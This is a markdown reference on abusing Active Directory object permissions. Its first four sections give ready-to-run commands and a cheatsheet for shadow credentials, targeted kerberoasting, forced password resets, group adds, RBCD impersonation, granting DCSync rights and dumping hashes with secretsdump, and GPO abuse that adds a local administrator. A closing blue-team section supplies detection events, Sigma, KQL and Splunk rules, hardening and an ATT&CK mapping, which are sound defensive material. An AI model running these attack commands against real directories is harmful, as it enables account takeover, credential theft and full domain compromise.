# Active Directory ACL / DACL Abuse

Deep reference for abusing object permissions (DACLs/ACEs) in Active Directory: GenericAll, GenericWrite, WriteDACL, WriteOwner, ForceChangePassword, AddSelf/AddMember, GPO abuse, and granting DCSync rights. ACL paths are what BloodHound highlights most — this file is the "how to walk the edge" companion. See `ad-enumeration-and-attacks.md`, `kerberos-attacks.md`, and `bloodhound-and-recon.md`.

---

## 1. Enumerate Who Has Rights Over What

```powershell
# PowerView — find interesting ACLs your principal holds over others
Find-InterestingDomainAcl -ResolveGUIDs |
  ? { $_.IdentityReferenceName -eq "$env:USERNAME" } |
  select ObjectDN, ActiveDirectoryRights, IdentityReferenceName

# ACEs on a specific object
Get-DomainObjectAcl -Identity "TargetUser" -ResolveGUIDs |
  ? { $_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteOwner|WriteDacl|WriteProperty|ExtendedRight' }

# Map a SID back to a name
Convert-SidToName <SID>
```
```bash
# Linux: dump ACLs / find your edges
nxc ldap <DC_IP> -u user -p pass -M daclread -o TARGET=TargetUser ACTION=read
bloodyAD -d domain.local -u user -p pass --host <DC_IP> get writable        # objects you can write
```
> BloodHound is the practical way to find these — the "Outbound Object Control" tab of a node you own shows every ACL edge.

### Right → primitive map
| ACE on target | What it gives you |
|---------------|-------------------|
| **GenericAll** | everything below (reset pw, add member, set SPN/keycred/RBCD) |
| **GenericWrite / WriteProperty** | set SPN (targeted kerberoast), set msDS-KeyCredentialLink (shadow creds), set RBCD, set logon script |
| **WriteDACL** | add a new ACE granting yourself GenericAll (or DCSync on domain) |
| **WriteOwner** | set yourself as owner → then WriteDACL → GenericAll |
| **User-Force-Change-Password / ForceChangePassword** | reset the target's password (no old pw) |
| **Self / AddSelf** (on a group) | add yourself as a member |
| **AllExtendedRights** (on user) | reset password; (on domain) DCSync |
| **GetChanges + GetChangesAll** (domain) | **DCSync** |
| **Owns / WriteOwner on GPO**, link rights | GPO abuse → SYSTEM on linked OUs |

---

## 2. Exploiting Each Right

### 2.1 GenericAll / GenericWrite on a USER
Multiple options — pick the stealthiest your target DFL allows.
```bash
# (a) Shadow Credentials (no password change — preferred, reversible). DFL 2016+, CA present.
pywhisker -d domain.local -u attacker -p pass --target victim --action add
certipy auth -pfx victim.pfx -dc-ip <DC_IP>             # → victim TGT + NT hash

# (b) Targeted Kerberoast (set a temp SPN, roast, crack, revert)
impacket-targetedKerberoast -d domain.local -u attacker -p pass --dc-ip <DC_IP>

# (c) Force password reset (loud, breaks the account for the user)
impacket-changepasswd domain.local/victim@<DC_IP> -newpass 'NewPass1!' -reset -altuser domain.local/attacker -altpass pass
net rpc password victim 'NewPass1!' -U domain.local/attacker%pass -S <DC_IP>
```
```powershell
# PowerView force reset
$p = ConvertTo-SecureString 'NewPass1!' -AsPlainText -Force
Set-DomainUserPassword -Identity victim -AccountPassword $p
# PowerView set SPN for targeted kerberoast
Set-DomainObject -Identity victim -Set @{serviceprincipalname='nonexistent/svc'}
```

### 2.2 GenericAll / GenericWrite on a COMPUTER
```bash
# RBCD: set msDS-AllowedToActOnBehalfOfOtherIdentity → impersonate any user to it
impacket-rbcd -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action write domain.local/attacker:pass -dc-ip <DC_IP>
impacket-getST -spn cifs/target.domain.local -impersonate Administrator 'domain.local/EVIL$:Passw0rd!' -dc-ip <DC_IP>
# OR Shadow Credentials on the computer:
pywhisker -d domain.local -u attacker -p pass --target 'TARGET$' --action add
certipy auth -pfx target.pfx -dc-ip <DC_IP>            # → TARGET$ TGT → silver/secrets
```

### 2.3 GenericAll / Self / AddMember on a GROUP
```bash
# Add yourself (or a controlled user) to the group
net rpc group addmem "TargetGroup" attacker -U domain.local/attacker%pass -S <DC_IP>
bloodyAD -d domain.local -u attacker -p pass --host <DC_IP> add groupMember "TargetGroup" attacker
```
```powershell
Add-DomainGroupMember -Identity 'TargetGroup' -Members attacker        # PowerView
net group "TargetGroup" attacker /add /domain
```
If the group is privileged (e.g. **Account Operators → reset most users**, or a group with delegated rights), chain onward.

### 2.4 WriteDACL on an object (or the domain)
Grant yourself full control, or **DCSync** if on the domain object.
```powershell
# Give yourself GenericAll on a target
Add-DomainObjectAcl -TargetIdentity victim -PrincipalIdentity attacker -Rights All
# Grant DCSync (replication) rights on the domain → then secretsdump -just-dc
Add-DomainObjectAcl -TargetIdentity 'DC=domain,DC=local' -PrincipalIdentity attacker -Rights DCSync
```
```bash
bloodyAD -d domain.local -u attacker -p pass --host <DC_IP> add dcsync attacker
# then:
impacket-secretsdump domain.local/attacker:pass@<DC_IP> -just-dc
```

### 2.5 WriteOwner on an object
```powershell
Set-DomainObjectOwner -Identity victim -OwnerIdentity attacker     # become owner
Add-DomainObjectAcl  -TargetIdentity victim -PrincipalIdentity attacker -Rights All   # then grant rights
```
```bash
bloodyAD -d domain.local -u attacker -p pass --host <DC_IP> set owner victim attacker
```

### 2.6 ForceChangePassword
```bash
net rpc password victim 'NewP@ss1!' -U domain.local/attacker%pass -S <DC_IP>
```

### 2.7 GPO abuse (edit a GPO you can write → SYSTEM on linked machines)
```bash
# Find writable GPOs / who they apply to
nxc ldap <DC_IP> -u user -p pass -M gpp_password        # legacy cpassword in SYSVOL
# Abuse with pyGPOAbuse / SharpGPOAbuse: add a computer startup script or immediate scheduled task
pygpoabuse domain.local/attacker:pass -gpo-id <GPO_GUID> -command 'net localgroup administrators attacker /add'
```
```powershell
# SharpGPOAbuse (Windows)
SharpGPOAbuse.exe --AddComputerTask --TaskName "u" --Author dom\a --Command "cmd.exe" --Arguments "/c net localgroup administrators attacker /add" --GPOName "VulnGPO"
gpupdate /force   # on target, or wait for refresh
```

---

## 3. Common ACL Chains (what BloodHound paths look like)

```
You ──GenericWrite──▶ victimUser ──MemberOf──▶ Help Desk ──ForceChangePassword──▶ DA-candidate
You ──WriteDACL──▶ Domain ──(add DCSync)──▶ krbtgt hash ──▶ Golden Ticket
You ──GenericAll──▶ WS01$ ──(RBCD)──▶ impersonate DA to WS01 ──▶ local SYSTEM ──▶ harvest creds
You ──Owns──▶ GPO ──LinkedTo──▶ Servers OU ──▶ SYSTEM on every server
You ──AddSelf──▶ Backup Operators ──SeBackup──▶ read NTDS.dit ──▶ all hashes
```
Always **mark owned** in BloodHound and re-run "Shortest paths from owned principals to Domain Admins" after each hop.

---

## 4. Cheatsheet

```bash
# ENUM (Linux)
bloodyAD -d dom -u u -p p --host <DC> get writable
nxc ldap <DC> -u u -p p -M daclread -o TARGET=victim ACTION=read

# GenericWrite/All on USER → shadow creds (preferred)
pywhisker -d dom -u u -p p --target victim --action add
certipy auth -pfx victim.pfx -dc-ip <DC>

# Force pw reset
net rpc password victim 'New1!' -U dom/u%p -S <DC>

# Add to group
bloodyAD -d dom -u u -p p --host <DC> add groupMember "Group" u

# WriteDACL → DCSync
bloodyAD -d dom -u u -p p --host <DC> add dcsync u
impacket-secretsdump dom/u:p@<DC> -just-dc

# WriteOwner → own → grant
bloodyAD -d dom -u u -p p --host <DC> set owner victim u

# Computer GenericWrite → RBCD
impacket-rbcd -delegate-from EVIL$ -delegate-to TARGET$ -action write dom/u:p -dc-ip <DC>
```

---

## Detection & Mitigation

> Blue-team companion to the ACL/DACL abuse above. The defining signal of these techniques is **a DACL/ownership/membership change written to a directory object** (`WriteDACL`, `WriteOwner`, `GenericAll`, `GenericWrite`, `AddMember`/`Self`, `ForceChangePassword`, granting DCSync `GetChanges`/`GetChangesAll`, or GPO edits) — almost always followed by the attacker *using* the right. Detection focuses on the modification event itself, especially on high-value objects, and on the abuse primitives that ACE grants unlock.

### Telemetry & Log Sources

- **Directory Service object modification — Event ID 5136** (Security log on DCs): fires on every attribute change including `nTSecurityDescriptor` (the DACL/owner). This is the single most important source for `WriteDACL`/`WriteOwner`/`GenericWrite` abuse. Requires **"Audit Directory Service Changes"** (Advanced Audit Policy → DS Access) enabled, plus **SACLs** on the objects you care about (see below).
- **Directory Service Access — Event ID 4662** ("An operation was performed on an object"): records access to AD objects by GUID. Critical for spotting **DCSync** — look for `Properties` containing the replication control-access GUIDs `DS-Replication-Get-Changes` (`1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`) and `DS-Replication-Get-Changes-All` (`1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`). Requires "Audit Directory Service Access".
- **SACLs on sensitive objects** — without a System ACL, 5136/4662 are not generated for those objects. Place auditing ACEs (Everyone / `Write` / `WriteDacl` / `Write Owner` / control-access) on: the **domain root** object, **AdminSDHolder** (`CN=AdminSDHolder,CN=System,DC=...`), all **GPO** objects (`CN=Policies,CN=System`), Tier-0 groups (Domain/Enterprise/Schema Admins, Administrators, Backup Operators, Account Operators), the **krbtgt** account, and any canary/honeypot principals.
- **Account management events**: **4728/4729** (member added/removed from a *global/security* group), **4732/4733** (local group), **4756/4757** (universal group), **4724** (privileged password reset / `ForceChangePassword`), **4738** (user object changed), **4781** (account name change). 4728/4756 on Tier-0 groups are high-fidelity.
- **GPO change telemetry**: 5136 on GPO container objects, plus **SYSVOL file/share auditing** (object-access 4663) on `\\<domain>\SYSVOL\<domain>\Policies\` to catch new/edited scripts, scheduled-task XML, and `GptTmpl.inf`.
- **Microsoft Defender for Identity (MDI) / legacy ATA**: native alerts for DCSync ("Suspected DCSync attack"), suspicious additions to sensitive groups, and reconnaissance — derived from DC traffic, not just the event log, so harder for the attacker to suppress.
- **LDAP/replication telemetry**: replication requests outside the DC↔DC channel (a non-DC principal performing `DRSGetNCChanges`) are abnormal and surface via 4662 + MDI.
- Forward DC Security logs to SIEM with sufficient retention; SACL-driven 5136/4662 volume is high, so size collection accordingly.

### Detection Logic

Behavioral patterns to alert on:
- **DACL/owner change on a high-value object** (5136 modifying `nTSecurityDescriptor` on the domain root, AdminSDHolder, a GPO, or a Tier-0 group) by a non-Tier-0 / non-change-window principal.
- **DCSync from a non-DC** (4662 with replication GUIDs where the subject is not a domain controller machine account) — near-certain malicious.
- **Grant of replication rights** (5136 adding an ACE containing `GetChanges`/`GetChangesAll` to the domain object).
- **New ACE granting GenericAll/WriteDacl/WriteOwner** to a low-privilege principal on a user/computer.
- **Privileged group membership change** (4728/4756) on Domain/Enterprise/Schema Admins, Administrators, Backup Operators, Account Operators, esp. via a `Self`/`AddMember` ACE.
- **Targeted-kerberoast setup**: 5136/4738 setting `servicePrincipalName` on a normal user account that previously had none.
- **Shadow credentials**: 5136 writing `msDS-KeyCredentialLink` on a user or computer object (a key primitive GenericWrite unlocks).
- **RBCD setup**: 5136 writing `msDS-AllowedToActOnBehalfOfOtherIdentity` on a computer object.
- **Canary/honeypot ACL**: any access (4662) or write attempt against a deliberately-attractive decoy object that no legitimate process should touch.

```yaml
title: AD DCSync Replication Request From Non-DC Principal
id: 9a1c3f10-ac2d-4b8b-9f3e-7c1d2e4a55b1
status: experimental
description: Detects directory replication (GetChanges/GetChangesAll) access against the domain naming context by a principal that is not a domain controller — the core DCSync primitive granted via WriteDACL.
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4662
    Properties|contains:
      - '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'   # DS-Replication-Get-Changes
      - '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'   # DS-Replication-Get-Changes-All
  filter_dc_machine_accounts:
    SubjectUserName|endswith: '$'   # tune to known DC computer accounts only
  filter_known_sync:
    SubjectUserName:
      - 'MSOL_'          # AAD Connect / Entra Connect sync account (allowlist your own)
  condition: selection and not filter_dc_machine_accounts and not filter_known_sync
fields:
  - SubjectUserName
  - SubjectDomainName
  - ObjectName
  - IpAddress
falsepositives:
  - Directory sync / backup products with legitimate replication rights (allowlist explicitly)
  - Domain controllers not yet added to the DC allowlist
level: high
tags:
  - attack.credential-access
  - attack.t1003.006
```

```yaml
title: DACL or Owner Modified on High-Value AD Object
id: 2f7b6c44-1e90-4d2a-8a55-3c0b9d7e1a22
status: experimental
description: Detects modification of the security descriptor (DACL/owner) on Tier-0 / high-value directory objects — the signal for WriteDACL / WriteOwner / GenericAll abuse. Requires Audit Directory Service Changes plus SACLs on the listed objects.
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 5136
    AttributeLDAPDisplayName:
      - 'nTSecurityDescriptor'
  highvalue:
    ObjectDN|contains:
      - 'CN=AdminSDHolder,CN=System'
      - 'CN=Policies,CN=System'        # GPOs
      - 'CN=Domain Admins'
      - 'CN=Enterprise Admins'
      - 'CN=Schema Admins'
      - 'CN=Administrators'
      - 'CN=Backup Operators'
      - 'CN=Account Operators'
      - 'CN=krbtgt'
  domainroot:
    ObjectClass: 'domainDNS'
  condition: selection and (highvalue or domainroot)
fields:
  - SubjectUserName
  - ObjectDN
  - AttributeValue
falsepositives:
  - Sanctioned delegation / ACL changes during approved change windows (correlate with change tickets)
level: high
tags:
  - attack.defense-evasion
  - attack.t1222.001
  - attack.t1484
```

```yaml
title: Dangerous Attribute Write Enabling AD Abuse (KeyCredentialLink / RBCD / SPN)
id: 4d8e2a91-77c5-4f6b-bb10-9e2f6a3c8d40
status: experimental
description: Detects writes to attributes commonly abused after a GenericWrite/GenericAll ACE — shadow credentials (msDS-KeyCredentialLink), RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity), and targeted kerberoast (servicePrincipalName) on user/computer objects.
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 5136
    AttributeLDAPDisplayName:
      - 'msDS-KeyCredentialLink'
      - 'msDS-AllowedToActOnBehalfOfOtherIdentity'
      - 'servicePrincipalName'
  condition: selection
fields:
  - SubjectUserName
  - ObjectDN
  - AttributeLDAPDisplayName
  - AttributeValue
falsepositives:
  - Windows Hello for Business enrolment (legitimate msDS-KeyCredentialLink writes — baseline ADFS/WHfB hosts)
  - Authorized constrained-delegation configuration changes
  - SPN registration by service installers / admins
level: medium
tags:
  - attack.credential-access
  - attack.t1098
  - attack.t1558.003
```

KQL (Microsoft Defender for Identity / Sentinel — replication rights granted on the domain object):

```kql
IdentityDirectoryEvents
| where ActionType == "Directory Services object modified"
| where AdditionalFields has_any ("DS-Replication-Get-Changes", "GetChangesAll", "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2")
| where TargetObject has_any ("DC=", "domainDNS")
| project Timestamp, AccountUpn, ActionType, TargetObject, AdditionalFields
```

Splunk SPL (privileged group membership added — Tier-0):

```spl
index=wineventlog (EventCode=4728 OR EventCode=4756)
  TargetUserName IN ("Domain Admins","Enterprise Admins","Schema Admins","Administrators","Backup Operators","Account Operators")
| stats count min(_time) as firstTime values(MemberName) as added_members by TargetUserName SubjectUserName host
| where firstTime > relative_time(now(), "-15m@m")
```

### Hardening & Mitigations

- **Tiered administration model** (Microsoft Tier 0/1/2 / Enterprise Access Model): Tier-0 admins log on only to Tier-0 hosts; this neutralizes most ACL chains that pivot from a workstation to DA. (D3FEND: Privileged Account Management.)
- **Least-privilege ACL review & baselining**: export and baseline DACLs on every Tier-0 object; alert on drift. Remove broad/legacy ACEs (e.g., `Authenticated Users`/`Everyone`/`Domain Users` with `Write`/`WriteDacl`/`GenericAll`). Tools: `Find-InterestingDomainAcl` (read-only audit use), `Get-Acl`, or PingCastle/Purple Knight for posture scoring. (Maps to **T1222 — File and Directory Permissions Modification**.)
- **Protect AdminSDHolder**: keep `dSHeuristics` default, monitor 5136 on the AdminSDHolder object, and verify SDProp (runs hourly) is re-stamping protected principals. Do not add custom ACEs to AdminSDHolder. (Counters **T1484** / ACL-based persistence.)
- **Remove dangerous standing ACEs**: eliminate `GenericAll`/`WriteDacl`/`WriteOwner`/`ForceChangePassword` held by non-Tier-0 principals over privileged objects; replace with audited, time-bound delegation (e.g., PAM/JIT).
- **Constrain GPO control**: restrict who can create/link/edit GPOs to a small Tier-0 group; audit `CN=Policies` and SYSVOL; consider GPO change-control and central store integrity monitoring. (Counters **T1484.001 — Group Policy Modification**.)
- **Defend DCSync**: replication rights should belong only to DCs and the AAD/Entra Connect sync account; alert on any other grant or use; deploy **Defender for Identity** for built-in DCSync detection. (Counters **T1003.006**.)
- **Protected Users group + `Account is sensitive and cannot be delegated`** on Tier-0 accounts; this blocks RBCD/delegation-based impersonation of those identities.
- **Disable/limit Machine Account Quota** (`ms-DS-MachineAccountQuota = 0`) to remove the attacker-controlled `EVIL$` machine account commonly used in RBCD.
- **Windows Hello for Business hygiene**: baseline legitimate `msDS-KeyCredentialLink` writers so shadow-credential abuse stands out; consider monitoring/managing the NGC key attribute.
- **Honeypot/canary objects**: a tempting decoy user/computer/GPO with a tight SACL — any touch is high-fidelity. (D3FEND: Decoy Object.)
- **Enable the required audit policies**: "Audit Directory Service Changes" and "Audit Directory Service Access" (Success), plus SACLs, or none of the detections above fire.

### MITRE ATT&CK Mapping

| Technique | ID | Detection / Mitigation note |
|-----------|-----|------------------------------|
| Domain Policy Modification | T1484 | Alert on 5136 DACL changes to high-value objects; restrict who can modify domain/Tier-0 ACLs |
| Group Policy Modification | T1484.001 | 5136 on GPO objects + SYSVOL file-write auditing; lock down GPO create/link/edit |
| File & Directory Permissions Mod. (DACL) | T1222.001 | Baseline & alert on `nTSecurityDescriptor` changes; remove dangerous standing ACEs |
| Account Manipulation (shadow creds / ACE add) | T1098 | 5136 on `msDS-KeyCredentialLink`; baseline WHfB; audit ACE additions |
| OS Credential Dumping: DCSync | T1003.006 | 4662 replication GUIDs from non-DC; restrict replication rights; Defender for Identity |
| Steal/Forge Kerberos Tickets: Kerberoasting | T1558.003 | 5136 on `servicePrincipalName` set on a normal user; alert on targeted-roast setup |
| Account Manipulation: privileged group add | T1098 / 4728-4756 | High-fidelity alert on additions to Tier-0 groups via `Self`/`AddMember` ACEs |
| Valid Accounts: Domain Accounts | T1078.002 | Tiered admin model; remove standing privilege; JIT/PAM with auditing |

---

## References

- The Hacker Recipes – DACL/ACL abuse — https://www.thehacker.recipes/ad/movement/dacl/
- HackTricks – ACL persistence/abuse — https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse
- bloodyAD — https://github.com/CravateRouge/bloodyAD
- PowerView (Set/Add-DomainObjectAcl) — https://powersploit.readthedocs.io/en/latest/Recon/
- SharpGPOAbuse — https://github.com/FSecureLABS/SharpGPOAbuse
- pyGPOAbuse — https://github.com/Hackndo/pyGPOAbuse
- SpecterOps – An ACE Up the Sleeve — https://specterops.io/wp-content/uploads/sites/3/2022/06/an_ace_up_the_sleeve.pdf
